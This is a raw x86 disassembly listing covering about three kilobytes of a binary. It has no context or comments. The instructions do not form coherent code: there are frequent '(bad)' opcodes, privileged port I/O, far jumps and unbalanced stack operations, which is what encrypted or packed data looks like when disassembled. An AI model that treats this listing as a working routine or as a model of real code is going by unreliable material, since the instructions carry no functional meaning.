  413c5f:	imul   ebx,esi,0xfffffffd
  413c62:	mov    ebp,0xa1a07b34
  413c67:	sub    bl,BYTE PTR [edx-0x5c]
  413c6a:	xchg   BYTE PTR [ecx-0xa2b1407],dl
  413c70:	mov    bl,0xa3
  413c72:	dec    esi
  413c73:	sbb    DWORD PTR [ecx+0xc542106],edi
  413c79:	mov    ebp,0x89f741f7
  413c7e:	stos   DWORD PTR es:[edi],eax
  413c7f:	in     eax,0x75
  413c81:	xchg   BYTE PTR [edx-0x5c],ah
  413c84:	xchg   esp,eax
  413c85:	frstor [ebx]
  413c87:	(bad)  
  413c88:	cwde   
  413c89:	ret    
  413c8a:	lds    edx,FWORD PTR [eax+eiz*4]
  413c8d:	adc    ah,BYTE PTR [esi+0x210a1559]
  413c93:	and    BYTE PTR [eax+0x4da6ef3d],al
  413c99:	inc    esp
  413c9a:	jns    0x413c94
  413c9c:	inc    eax
  413c9d:	repnz adc DWORD PTR [edx],edi
  413ca0:	sub    BYTE PTR [edi],dh
  413ca2:	or     eax,0xdb41f244
  413ca7:	adc    esi,edi
  413ca9:	pop    eax
  413caa:	add    BYTE PTR [eax],bh
  413cac:	or     DWORD PTR [ebx-0x5e],esi
  413caf:	jg     0x413c71
  413cb1:	gs stos DWORD PTR es:[edi],eax
  413cb3:	aas    
  413cb4:	mov    dh,0x3b
  413cb6:	ret    0xac87
  413cb9:	pop    DWORD PTR ds:0x50570e6e
  413cbf:	mov    dh,0x40
  413cc1:	xor    BYTE PTR [ebx+0x3e4edc18],0x90
  413cc8:	mov    edi,0xf366684e
  413ccd:	ja     0x413d05
  413ccf:	inc    esi
  413cd0:	jns    0x413cbb
  413cd2:	push   es
  413cd3:	or     BYTE PTR [edi],bh
  413cd5:	sti    
  413cd6:	out    0x69,eax
  413cd8:	sub    dl,BYTE PTR [ebx+0x60]
  413cdb:	xchg   edi,eax
  413cdc:	dec    esp
  413cdd:	jle    0x413c9f
  413cdf:	bound  eax,QWORD PTR [eax-0x5a54bde1]
  413ce5:	xor    al,dh
  413ce7:	xor    DWORD PTR [edi+0x1e],0x9441a48e
  413cee:	mov    esp,0x18401ac7
  413cf3:	retf   
  413cf4:	pop    ss
  413cf5:	add    bh,BYTE PTR [ecx]
  413cf7:	xchg   esp,eax
  413cf8:	mov    esp,0x68f8482
  413cfd:	xor    eax,0x7b6dca90
  413d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d04:	in     eax,dx
  413d05:	inc    ebx
  413d06:	mov    eax,0x6d8752c5
  413d0b:	push   esp
  413d0c:	call   FWORD PTR [edx-0x2db2cd7b]
  413d12:	sub    ch,ch
  413d14:	sub    DWORD PTR [ecx+0x1e1a609],edx
  413d1a:	cmp    ch,BYTE PTR [edx]
  413d1c:	ja     0x413d2e
  413d1e:	mov    ds:0x1d374d5d,eax
  413d23:	shl    BYTE PTR [ebx-0x14d4350d],1
  413d29:	pop    eax
  413d2a:	mov    bl,0xe1
  413d2c:	xlat   BYTE PTR ds:[ebx]
  413d2d:	xor    eax,0x31aa7c86
  413d32:	xchg   ecx,eax
  413d33:	xchg   ebx,eax
  413d34:	push   ecx
  413d35:	mov    bl,BYTE PTR [ebp-0x44d776f1]
  413d3b:	jmp    0xf643:0xd208d30f
  413d42:	xchg   ebp,eax
  413d43:	mov    ebp,DWORD PTR cs:[ecx-0x5a20a6e3]
  413d4a:	pusha  
  413d4b:	aas    
  413d4c:	and    BYTE PTR [ebp+0x474e84c4],al
  413d52:	retf   0x34cb
  413d55:	call   0x5972:0x6cc53b41
  413d5c:	arpl   bp,dx
  413d5e:	cmp    ch,BYTE PTR [ebx+0x4da10543]
  413d64:	das    
  413d65:	rcl    BYTE PTR [esi-0x3f2b1bb3],cl
  413d6b:	mov    bl,0x99
  413d6d:	gs push eax
  413d6f:	sub    al,0xed
  413d71:	mov    cl,0x3d
  413d73:	out    0x99,eax
  413d75:	lods   eax,DWORD PTR ds:[esi]
  413d76:	cld    
  413d77:	add    esi,DWORD PTR [ebx-0x1efdda30]
  413d7d:	fiadd  DWORD PTR [eax]
  413d7f:	xor    BYTE PTR ds:0x809f69b7,bl
  413d85:	xchg   ebx,eax
  413d86:	push   ds
  413d87:	lea    edi,[eax-0x6e7ddbb3]
  413d8d:	xchg   ebp,esi
  413d8f:	pusha  
  413d90:	inc    ebp
  413d91:	sub    BYTE PTR [ebp+0x28],0xca
  413d95:	lds    edx,FWORD PTR [ebp+0x5cb54749]
  413d9b:	jne    0x413e03
  413d9d:	in     al,0x12
  413d9f:	pop    ebx
  413da0:	sub    dl,BYTE PTR [ecx+0x4f]
  413da3:	sti    
  413da4:	aad    0x47
  413da6:	sbb    DWORD PTR ds:0x48cfc526,edx
  413dac:	adc    eax,0xcbdf65b0
  413db1:	sbb    al,0x84
  413db3:	jns    0x413d68
  413db5:	xchg   BYTE PTR [esi-0xe0d974a],cl
  413dbb:	adc    DWORD PTR [edx+0x4dbfedbf],esp
  413dc1:	inc    ebx
  413dc2:	and    ebx,ebx
  413dc4:	fisttp QWORD PTR [eax]
  413dc6:	subps  xmm1,XMMWORD PTR [eax+0x46]
  413dca:	and    eax,0xc62877a3
  413dcf:	in     eax,0x62
  413dd1:	cmp    BYTE PTR ds:0x19293bc8,dl
  413dd7:	dec    esp
  413dd8:	mov    bl,BYTE PTR [ebx+edi*4]
  413ddb:	mov    edi,0x6f0d6514
  413de0:	aad    0xb9
  413de2:	sbb    dl,ah
  413de4:	ja     0x413dfd
  413de6:	dec    ebp
  413de7:	adc    al,0x2e
  413de9:	xchg   edi,eax
  413dea:	lock fnsave [esi-0x7e]
  413dee:	test   bl,dh
  413df0:	xchg   esp,eax
  413df1:	dec    ebx
  413df2:	test   DWORD PTR [edi+eiz*4],0xc8a4d378
  413df9:	aaa    
  413dfa:	popf   
  413dfb:	mov    bh,0x3b
  413dfd:	sbb    al,0x76
  413dff:	adc    BYTE PTR [eax+0x5b],0xe5
  413e03:	inc    ebx
  413e04:	jae    0x413e81
  413e06:	push   ss
  413e07:	and    eax,0x2670949c
  413e0c:	(bad)  
  413e0d:	out    dx,al
  413e0e:	sub    eax,0x560e42e4
  413e13:	pop    es
  413e14:	test   DWORD PTR [esi+0x2b],0x62b908eb
  413e1b:	mov    esp,0x314a80ed
  413e20:	xchg   edx,eax
  413e21:	mov    ds:0xb00d205c,al
  413e26:	cld    
  413e27:	fs test eax,0xd1dfbd1a
  413e2d:	test   al,0xe2
  413e2f:	mov    WORD PTR [eax],?
  413e31:	xchg   ebp,eax
  413e32:	adc    al,dh
  413e34:	js     0x413dd5
  413e36:	sbb    esi,DWORD PTR [eax+0x2a]
  413e39:	push   cs
  413e3a:	jmp    0xd725d20a
  413e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e40:	dec    edx
  413e41:	xchg   edi,eax
  413e42:	jmp    0xdb15db4
  413e47:	sub    al,0xa0
  413e49:	sbb    DWORD PTR [ecx+ebx*4-0xc],edi
  413e4d:	adc    eax,0xfeec0d9c
  413e52:	retf   
  413e53:	dec    ebx
  413e54:	sti    
  413e55:	xchg   ecx,eax
  413e56:	cdq    
  413e57:	retf   0xbfcd
  413e5a:	iret   
  413e5b:	push   edx
  413e5c:	arpl   WORD PTR [edi],si
  413e5e:	pop    esp
  413e5f:	(bad)  
  413e60:	aad    0x6
  413e62:	sbb    BYTE PTR [eax-0x2f],cl
  413e65:	dec    esp
  413e66:	mov    es,WORD PTR [ebp+0x35]
  413e69:	repz sub ch,BYTE PTR [esi-0x63]
  413e6d:	in     al,0x47
  413e6f:	popf   
  413e70:	cmp    eax,DWORD PTR [edi+0x14cc1b4e]
  413e76:	mov    eax,ds:0xe2d8f90f
  413e7b:	jbe    0x413ecd
  413e7d:	dec    ebx
  413e7e:	sbb    al,0xd
  413e80:	sahf   
  413e81:	mov    dh,0x21
  413e83:	daa    
  413e84:	adc    ebx,DWORD PTR ds:0xe0383293
  413e8a:	stos   BYTE PTR es:[edi],al
  413e8b:	or     bh,BYTE PTR [edx-0x61abe67a]
  413e91:	push   ss
  413e92:	nop    DWORD PTR [edx+ebp*4-0x5bb04319]
  413e9a:	pop    es
  413e9b:	fisubr WORD PTR [ecx-0x50]
  413e9e:	sahf   
  413e9f:	jne    0x413e5d
  413ea1:	pushf  
  413ea2:	push   cs
  413ea3:	mov    eax,0x803667f9
  413ea8:	or     eax,0x1a7156ad
  413ead:	sbb    ecx,DWORD PTR [esi+0x4e]
  413eb0:	int3   
  413eb1:	push   0xffffffb6
  413eb3:	cmp    BYTE PTR [ecx+0x6a],bh
  413eb6:	sbb    eax,0x6235e8b7
  413ebb:	sbb    eax,0x329a5e4
  413ec0:	shl    BYTE PTR [edi],0x1b
  413ec3:	sub    al,0x76
  413ec5:	cmp    DWORD PTR [ebx+0x621b0a2f],eax
  413ecb:	mov    DWORD PTR [edx+edx*4-0x6f],eax
  413ecf:	mov    cl,0xbd
  413ed1:	leave  
  413ed2:	(bad)  
  413ed3:	pusha  
  413ed4:	test   al,dl
  413ed6:	popf   
  413ed7:	sub    ah,0x7e
  413eda:	out    dx,eax
  413edb:	jp     0x413e87
  413edd:	dec    ebp
  413ede:	into   
  413edf:	or     al,0xc6
  413ee1:	popf   
  413ee2:	xor    al,0x58
  413ee4:	pop    es
  413ee5:	cmp    al,0xe8
  413ee7:	imul   ebp,DWORD PTR [esi+0x27],0xe799827e
  413eee:	dec    eax
  413eef:	and    esi,eax
  413ef1:	scas   eax,DWORD PTR es:[edi]
  413ef2:	bound  ebp,QWORD PTR ds:0x9ce026ae
  413ef8:	mov    edx,DWORD PTR [ebx]
  413efa:	mov    ds,WORD PTR [ebx]
  413efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413efd:	cmp    ah,bl
  413eff:	push   edi
  413f00:	xchg   ebx,eax
  413f01:	pop    ss
  413f02:	dec    ecx
  413f03:	sbb    BYTE PTR [edx],ch
  413f05:	stos   DWORD PTR es:[edi],eax
  413f06:	or     esp,edi
  413f08:	fcom   QWORD PTR [ebx+0x61]
  413f0b:	inc    edi
  413f0c:	jg     0x413eca
  413f0e:	mov    cl,0x81
  413f10:	stos   DWORD PTR es:[edi],eax
  413f11:	and    esi,ecx
  413f13:	add    dh,BYTE PTR [ebx]
  413f15:	in     al,0x9
  413f17:	mov    eax,ds:0x80534692
  413f1c:	fdivr  DWORD PTR [eax+0x76481741]
  413f22:	gs test al,0xe
  413f25:	sbb    eax,0x9fae03c5
  413f2a:	aas    
  413f2b:	mov    ch,BYTE PTR [edx+ebp*8-0x218c1131]
  413f32:	ds and al,0x3f
  413f35:	jne    0x413fa7
  413f37:	ins    BYTE PTR es:[edi],dx
  413f38:	push   ebp
  413f39:	jge    0x413ee1
  413f3b:	dec    ecx
  413f3c:	in     al,0x50
  413f3e:	push   es
  413f3f:	in     al,dx
  413f40:	in     eax,0x25
  413f42:	or     DWORD PTR [eax-0xb],edi
  413f45:	xchg   ebx,eax
  413f46:	jle    0x413f5a
  413f48:	sub    bh,ah
  413f4a:	data16 mov BYTE PTR [eax],dh
  413f4d:	fiadd  DWORD PTR [edx-0x3a]
  413f50:	adc    ebp,esi
  413f52:	(bad)  
  413f53:	in     al,0x20
  413f55:	loope  0x413f5a
  413f57:	cs jg  0x413f19
  413f5a:	(bad)  
  413f5b:	cli    
  413f5c:	repnz cs push ecx
  413f5f:	jmp    0xfea3dc4b
  413f64:	fldcw  WORD PTR [eax]
  413f66:	call   0x292f89ad
  413f6b:	mov    edi,0x206f6eb9
  413f70:	pop    edi
  413f71:	mov    cl,0x74
  413f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f74:	scas   eax,DWORD PTR es:[edi]
  413f75:	mov    fs,esp
  413f77:	push   edi
  413f78:	clc    
  413f79:	gs iret 
  413f7b:	add    edi,DWORD PTR [ecx-0x42c66560]
  413f81:	shl    BYTE PTR [ebp+0x22407e19],1
  413f87:	mul    BYTE PTR [ebp+0x438f4a38]
  413f8d:	dec    edi
  413f8e:	mov    ?,ecx
  413f90:	daa    
  413f91:	dec    edi
  413f92:	outs   dx,DWORD PTR ds:[esi]
  413f93:	adc    al,BYTE PTR [edi]
  413f95:	fst    QWORD PTR [ecx]
  413f97:	add    ebp,DWORD PTR [ebp+0x2b]
  413f9a:	and    al,0x9
  413f9c:	xchg   BYTE PTR [ebx-0x64],dl
  413f9f:	mov    bl,0x6d
  413fa1:	loop   0x413f84
  413fa3:	outs   dx,BYTE PTR ds:[esi]
  413fa4:	adc    al,0x15
  413fa6:	stc    
  413fa7:	sbb    DWORD PTR [esi],0x712ac6eb
  413fad:	and    BYTE PTR [ecx+eax*8-0x45489ffd],0x28
  413fb5:	jle    0x414011
  413fb7:	pop    ebx
  413fb8:	pop    edi
  413fb9:	push   0x7
  413fbb:	into   
  413fbc:	jge    0x413f4e
  413fbe:	inc    eax
  413fbf:	xor    ebp,DWORD PTR [ecx+0x52]
  413fc2:	or     BYTE PTR [ebx],dh
  413fc4:	lods   al,BYTE PTR ds:[esi]
  413fc5:	gs cwde 
  413fc7:	popf   
  413fc8:	daa    
  413fc9:	out    0xc9,eax
  413fcb:	out    dx,al
  413fcc:	and    al,0xdd
  413fce:	stc    
  413fcf:	add    esp,ebp
  413fd1:	ficomp WORD PTR [edx]
  413fd3:	lahf   
  413fd4:	jl     0x41404c
  413fd6:	dec    esi
  413fd7:	sub    eax,0x37b0f79a
  413fdc:	nop
  413fdd:	dec    esp
  413fde:	mov    bh,BYTE PTR [ebp-0x64]
  413fe1:	ja     0x414037
  413fe3:	(bad)  
  413fe4:	(bad)  
  413fe6:	lahf   
  413fe7:	mov    edi,0x4212cedf
  413fec:	das    
  413fed:	mov    ebp,0x7d6c92c1
  413ff2:	xor    eax,DWORD PTR cs:[edi]
  413ff5:	sub    DWORD PTR [ebx],0x209efc2d
  413ffb:	and    eax,0xf2c5ff65
  414000:	es or  dh,bh
  414003:	div    ebp
  414005:	sub    bh,BYTE PTR [ebp-0x776c227]
  41400b:	not    DWORD PTR [edi-0x3db4205c]
  414011:	(bad)  
  414012:	mov    bh,0xf7
  414014:	lahf   
  414015:	mov    WORD PTR [eax],cs
  414017:	shl    DWORD PTR gs:[ebp-0x17e2f4f3],cl
  41401e:	pop    edx
  41401f:	mov    edx,DWORD PTR [edi+ebx*2-0x18a8a345]
  414026:	sbb    BYTE PTR [edi-0x4b860fcf],dh
  41402c:	mov    al,0x1f
  41402e:	jl     0x414056
  414030:	mov    WORD PTR [esi-0x4361146b],ds
  414036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414037:	dec    ecx
  414038:	push   0x43ce4037
  41403d:	int    0xf3
  41403f:	jb     0x414004
  414041:	(bad)  
  414042:	or     eax,0xf7d9c06b
  414047:	mov    cl,0x74
  414049:	mov    eax,ds:0x55a16576
  41404e:	inc    esi
  41404f:	cmp    ch,0x8c
  414052:	sbb    WORD PTR [ecx-0x47],sp
  414056:	jnp    0x414005
  414058:	in     al,dx
  414059:	pop    es
  41405a:	jg     0x414041
  41405c:	(bad)  
  41405d:	sub    al,0x47
  41405f:	es aad 0x9f
  414062:	leave  
  414063:	or     al,0xc1
  414065:	pop    ecx
  414066:	out    0xd7,eax
  414068:	dec    ecx
  414069:	push   ss
  41406a:	ss pop ebp
  41406c:	in     al,0x3e
  41406e:	enter  0xb0e2,0xcd
  414072:	icebp  
  414073:	dec    ebp
  414074:	pop    ebp
  414075:	xchg   DWORD PTR [esi+0x5e],ebp
  414078:	push   ebx
  414079:	inc    ebp
  41407a:	stos   DWORD PTR es:[edi],eax
  41407b:	(bad)  
  41407c:	sub    eax,0xcb43aefe
  414081:	xchg   ebp,eax
  414082:	cld    
  414083:	(bad)  
  414084:	(bad)  
  414085:	mov    BYTE PTR [ebp-0x27],ch
  414088:	pop    esp
  414089:	pop    esi
  41408a:	inc    ebx
  41408b:	loopne 0x4140f8
  41408d:	aaa    
  41408e:	xor    bl,BYTE PTR [edx-0x35c1449d]
  414094:	mov    ah,0xdd
  414096:	and    dl,BYTE PTR ds:0x8e4585a3
  41409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409d:	xchg   BYTE PTR [ecx+edx*1-0x265e2bf7],ah
  4140a4:	pop    edx
  4140a5:	data16 mov BYTE PTR [edi+0x711e59ab],0x3b
  4140ad:	imul   ecx,DWORD PTR [ecx+0x64],0xffffffd7
  4140b1:	jno    0x414069
  4140b3:	sub    DWORD PTR [ebx-0x42],0xc11574a5
  4140ba:	sbb    esp,eax
  4140bc:	sti    
  4140bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140be:	arpl   bx,cx
  4140c0:	fidiv  WORD PTR [ecx-0x63d0c3a0]
  4140c6:	sub    DWORD PTR [edi-0x1b6aba7],edx
  4140cc:	push   es
  4140cd:	fst    DWORD PTR [eax-0x24cefe3d]
  4140d3:	outs   dx,BYTE PTR ds:[esi]
  4140d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140d5:	das    
  4140d6:	out    0x7b,eax
  4140d8:	dec    edi
  4140d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140da:	test   eax,0xcb4f2c4d
  4140df:	fnsave [esi]
  4140e1:	fs push eax
  4140e3:	push   sp
  4140e5:	ret    0xb4d4
  4140e8:	fmul   st(7),st
  4140ea:	adc    eax,0xfd60b513
  4140ef:	adc    al,0x74
  4140f1:	add    dl,dl
  4140f3:	sti    
  4140f4:	sub    ecx,DWORD PTR [ebx]
  4140f6:	push   ss
  4140f7:	(bad)  
  4140f8:	adc    BYTE PTR [edi+edi*8],dl
  4140fb:	scas   eax,DWORD PTR es:[edi]
  4140fc:	es jb  0x41412e
  4140ff:	cmp    eax,0x6fcb9e19
  414104:	jl     0x414102
  414106:	fsub   DWORD PTR [edx]
  414108:	pop    eax
  414109:	nop
  41410a:	aad    0x99
  41410c:	pop    ebx
  41410d:	imul   edi,eax,0x78c976bd
  414113:	iret   
  414114:	rcl    esp,0x2
  414117:	mov    eax,DWORD PTR [edi+0x15]
  41411a:	jbe    0x4140b2
  41411c:	inc    esi
  41411d:	add    BYTE PTR [ebx-0x71],ah
  414120:	and    ebp,ebx
  414122:	in     eax,0x48
  414124:	arpl   WORD PTR ds:0xde203b58,sp
  41412a:	(bad)  
  41412b:	mov    al,ds:0xb230bc43
  414130:	add    al,0x20
  414132:	adc    ebx,ebx
  414134:	sub    esp,DWORD PTR [ebp-0x5f]
  414137:	loope  0x41411a
  414139:	scas   eax,DWORD PTR es:[edi]
  41413a:	xchg   edi,eax
  41413b:	sub    al,0x1f
  41413d:	mov    dl,0xe5
  41413f:	popf   
  414140:	jle    0x414169
  414142:	add    DWORD PTR ds:0xac96485,edx
  414148:	out    dx,al
  414149:	jns    0x414185
  41414b:	call   0xffb91ad9
  414150:	dec    edx
  414151:	mov    ds:0x8f689e04,al
  414156:	aam    0xdd
  414158:	mov    eax,esp
  41415a:	imul   edi,DWORD PTR [esi-0x33],0xfffffff2
  41415e:	jg     0x41415c
  414160:	pop    ebx
  414161:	or     BYTE PTR [edx+ebp*8],0xde
  414165:	xchg   edi,eax
  414166:	mov    eax,0xa819240b
  41416b:	pushf  
  41416c:	pop    edx
  41416d:	jb     0x414167
  41416f:	sub    esi,DWORD PTR [edx+0x65]
  414172:	(bad)  
  414173:	neg    BYTE PTR [edi+0x79]
  414176:	xchg   ebx,eax
  414177:	rcr    BYTE PTR [ecx-0x3a37a1c0],0xf4
  41417e:	or     esp,0xc622a4a
  414184:	call   0x99e3e68f
  414189:	push   edi
  41418a:	(bad)  
  41418b:	sbb    eax,edx
  41418d:	mov    dh,0x56
  41418f:	pop    es
  414190:	xor    al,0x6d
  414192:	(bad)  
  414194:	add    eax,0x376fe645
  414199:	push   ecx
  41419a:	sbb    al,0x2d
  41419c:	dec    edx
  41419d:	in     eax,0x54
  41419f:	and    bl,dh
  4141a1:	aaa    
  4141a2:	stos   DWORD PTR es:[edi],eax
  4141a3:	add    eax,DWORD PTR [esi+eax*4+0x31]
  4141a7:	(bad)  
  4141a9:	loopne 0x414171
  4141ab:	jl     0x41422c
  4141ad:	fcom   DWORD PTR [ecx]
  4141af:	out    dx,al
  4141b0:	fcom   QWORD PTR [eax-0x56a88424]
  4141b6:	gs push edi
  4141b8:	dec    ebp
  4141b9:	jmp    0xc60d:0xc38dbf57
  4141c0:	fld    DWORD PTR [eax+0x24b7117c]
  4141c6:	ds mov edi,0xd3aee9a7
  4141cc:	fld    TBYTE PTR [eax]
  4141ce:	add    BYTE PTR [eax+0x37d6ab4d],ch
  4141d4:	lahf   
  4141d5:	dec    DWORD PTR [ebp+0x606db05a]
  4141db:	dec    edi
  4141dc:	cmp    bh,BYTE PTR [eax+0x46489672]
  4141e2:	js     0x41418e
  4141e4:	xchg   esi,eax
  4141e5:	sbb    eax,0xf461322c
  4141ea:	push   edi
  4141eb:	xor    edi,DWORD PTR [edi]
  4141ed:	aam    0xbb
  4141ef:	sbb    al,0x57
  4141f1:	or     al,0xef
  4141f3:	addr16 mov eax,ds:0x8961
  4141f7:	retf   0xde9d
  4141fa:	push   0xb9b8edc4
  4141ff:	xchg   ecx,eax
  414200:	jmp    0x6119:0xdc60ef50
  414207:	mov    esp,0xfe035195
  41420c:	jno    0x4141e0
  41420e:	rol    BYTE PTR [ebx+0x49],cl
  414211:	mov    DWORD PTR [ecx-0x6720e130],edx
  414217:	xlat   BYTE PTR ds:[ebx]
  414218:	popa   
  414219:	popa   
  41421a:	leave  
  41421b:	mov    ds:0x44b6439e,eax
  414220:	retf   
  414221:	cmc    
  414222:	std    
  414223:	inc    ebp
  414224:	ds dec edx
  414226:	mov    DWORD PTR [ecx-0x59],ebx
  414229:	leave  
  41422a:	pop    ebx
  41422b:	push   eax
  41422c:	aas    
  41422d:	or     eax,0x211f5170
  414232:	ds ds (bad) 
  414235:	mov    ah,ch
  414237:	lods   eax,DWORD PTR ds:[esi]
  414238:	dec    esp
  414239:	sub    eax,0x37c75cd7
  41423e:	jmp    0x41426b
  414240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414241:	out    dx,eax
  414242:	hlt    
  414243:	and    cl,BYTE PTR [edx]
  414245:	mov    ah,BYTE PTR [edx]
  414247:	repnz sbb esp,edx
  41424a:	xchg   BYTE PTR [esi],dh
  41424c:	arpl   di,bp
  41424e:	scas   al,BYTE PTR es:[edi]
  41424f:	int3   
  414250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414251:	int3   
  414252:	adc    ah,BYTE PTR [edx+0x16d349be]
  414258:	sbb    BYTE PTR ds:0x9229432f,al
  41425e:	mov    esi,0x8f95f3a9
  414263:	stc    
  414264:	mov    ds:0xdefeae64,eax
  414269:	inc    edx
  41426a:	fnstsw WORD PTR [esp+esi*8]
  41426d:	dec    esp
  41426e:	rcr    BYTE PTR [edx+0x4e5fda1c],1
  414274:	icebp  
  414275:	mov    DWORD PTR [edx+esi*4],0xc9f3bd87
  41427c:	cmp    esp,DWORD PTR [ebp+0x2f68d239]
  414282:	lods   al,BYTE PTR ds:[esi]
  414283:	sub    DWORD PTR [ecx],edi
  414285:	scas   al,BYTE PTR es:[edi]
  414286:	enter  0x63b1,0x8f
  41428a:	push   ebp
  41428b:	push   ds
  41428c:	dec    ebp
  41428d:	adc    ecx,DWORD PTR [eax+0x3e]
  414290:	sti    
  414291:	rol    cl,1
  414293:	dec    ebx
  414294:	add    DWORD PTR [ebx-0x2a3692c5],eax
  41429a:	mov    ds:0x3469579,eax
  41429f:	(bad)  
  4142a0:	xchg   eax,edi
  4142a2:	popa   
  4142a3:	jp     0x4142ca
  4142a5:	dec    ebp
  4142a6:	mov    es,WORD PTR [ecx]
  4142a8:	mov    ds:0x7ffed4db,eax
  4142ad:	mov    ebx,0xbe31849c
  4142b2:	adc    BYTE PTR [edi],bh
  4142b4:	cmp    esp,0xffffff95
  4142b7:	or     esp,ecx
  4142b9:	or     eax,0xb15e484e
  4142be:	xor    al,0x9f
  4142c0:	mov    edi,0xef224015
  4142c5:	push   edi
  4142c6:	add    esp,0x4556b6bb
  4142cc:	retf   0x4eca
  4142cf:	stos   BYTE PTR es:[edi],al
  4142d0:	leave  
  4142d1:	inc    edx
  4142d2:	sub    al,0x56
  4142d4:	or     DWORD PTR [ecx-0x7a63223e],0x46
  4142db:	adc    ebp,DWORD PTR [esp+edx*2+0x1f021ec9]
  4142e2:	lds    edi,FWORD PTR [edi+0x3]
  4142e5:	int3   
  4142e6:	jae    0x4142ae
  4142e8:	xchg   esi,eax
  4142e9:	add    dh,BYTE PTR [edx-0x5b7a6394]
  4142ef:	sbb    al,0x47
  4142f1:	inc    cx
  4142f3:	and    DWORD PTR [edi+0x7f],0xa
  4142f7:	sar    edx,cl
  4142f9:	jp     0x4142e8
  4142fb:	cmp    DWORD PTR [edi+0x20],edx
  4142fe:	pushf  
  4142ff:	push   edi
  414300:	and    al,al
  414302:	adc    BYTE PTR [eax],0x1c
  414305:	push   ecx
  414306:	rcl    DWORD PTR [ebp-0x1a],cl
  414309:	outs   dx,BYTE PTR ds:[esi]
  41430a:	not    DWORD PTR [ebx-0x26e85351]
  414310:	fidiv  WORD PTR [ecx]
  414312:	scas   al,BYTE PTR es:[edi]
  414313:	pushf  
  414314:	jg     0x414355
  414316:	call   0x716ac84b
  41431b:	jns    0x4142da
  41431d:	mov    al,0xfd
  41431f:	js     0x414322
  414321:	jg     0x41431e
  414323:	cmc    
  414324:	iret   
  414325:	lods   al,BYTE PTR ds:[esi]
  414326:	inc    ebx
  414327:	out    dx,eax
  414328:	cdq    
  414329:	aam    0x5
  41432b:	mov    edx,0xe7c4be46
  414330:	jmp    0x4142d1
  414332:	test   BYTE PTR [ebx+0x9],ah
  414335:	pop    eax
  414336:	sbb    DWORD PTR [ecx+eiz*2],eax
  414339:	xor    al,0xd
  41433b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41433c:	mov    ch,0xa6
  41433e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41433f:	push   es
  414340:	xor    BYTE PTR [eax-0x684ae65],ch
  414346:	push   0x5f
  414348:	sub    DWORD PTR [ecx+ebp*4],esi
  41434b:	pop    ds
  41434c:	add    DWORD PTR [ecx-0x20],eax
  41434f:	adc    DWORD PTR ds:0x61c666a5,0xffffff85
  414356:	(bad)  
  414358:	add    esi,DWORD PTR [esi+0x40ecbbe9]
  41435e:	inc    esp
  41435f:	xchg   esi,eax
  414360:	mov    esi,0x588edda4
  414365:	lods   eax,DWORD PTR ds:[esi]
  414366:	mov    eax,0xc297acad
  41436b:	lds    ebx,FWORD PTR [esi]
  41436d:	inc    esp
  41436e:	(bad)  
  41436f:	xor    cl,BYTE PTR [eax]
  414371:	xor    eax,ebp
  414373:	leave  
  414374:	pusha  
  414375:	scas   al,BYTE PTR es:[edi]
  414376:	dec    edx
  414377:	in     eax,0x5e
  414379:	adc    dh,ah
  41437b:	cmp    ah,BYTE PTR [esi-0x6b]
  41437e:	xchg   edx,eax
  41437f:	aas    
  414380:	nop
  414381:	lock and BYTE PTR [eax-0x1e43502],dh
  414388:	inc    edx
  414389:	shl    DWORD PTR [esi-0x33],cl
  41438c:	jmp    0x4143ba
  41438e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41438f:	sbb    edx,DWORD PTR [ecx+0x9]
  414392:	fwait
  414393:	dec    ecx
  414394:	cld    
  414395:	cld    
  414396:	imul   ecx,eax,0xa8f7dcf8
  41439c:	fadd   QWORD PTR [ebx]
  41439e:	retf   
  41439f:	pop    es
  4143a0:	sar    DWORD PTR [eax-0x3b],0x33
  4143a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a5:	push   esp
  4143a6:	mov    edx,DWORD PTR [ebx]
  4143a8:	test   DWORD PTR ds:0x76875364,0x8de9b4b0
  4143b2:	fld    TBYTE PTR [eax]
  4143b4:	inc    ebp
  4143b5:	xor    edx,ebx
  4143b7:	mov    BYTE PTR [edi-0x7c16f1d6],cl
  4143bd:	pop    ecx
  4143be:	hlt    
  4143bf:	mov    esp,0x858aae3c
  4143c4:	add    BYTE PTR [esi],dl
  4143c6:	into   
  4143c7:	cdq    
  4143c8:	and    BYTE PTR [edx-0x6b],al
  4143cb:	ret    
  4143cc:	out    0x68,al
  4143ce:	rol    DWORD PTR [ebp-0x37],1
  4143d1:	mov    esi,0x10be4608
  4143d6:	or     eax,0x39252f01
  4143db:	or     al,0xc3
  4143dd:	jg     0x414372
  4143df:	test   BYTE PTR [esi],dh
  4143e1:	sahf   
  4143e2:	gs test eax,0x44c2aeaf
  4143e8:	xchg   ebx,eax
  4143e9:	pop    ebp
  4143ea:	ins    BYTE PTR es:[edi],dx
  4143eb:	mov    dh,0x5b
  4143ed:	stos   BYTE PTR es:[edi],al
  4143ee:	mov    eax,ds:0x3d843cba
  4143f3:	xchg   ebp,eax
  4143f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f5:	outs   dx,DWORD PTR ds:[esi]
  4143f6:	push   cs
  4143f7:	xor    eax,0xd9965635
  4143fc:	fisubr DWORD PTR [edx]
  4143fe:	outs   dx,DWORD PTR ds:[esi]
  4143ff:	xor    DWORD PTR [esi-0x6a],0xcab80cbd
  414406:	loope  0x41441f
  414408:	test   ebx,0xc6eb38c2
  41440e:	xchg   edi,eax
  41440f:	and    bh,BYTE PTR [esi+0x497a5965]
  414415:	jl     0x414444
  414417:	push   0x594a1891
  41441c:	daa    
  41441d:	(bad)  [eax]
  41441f:	mov    eax,0x2b5a1960
  414424:	ror    esi,cl
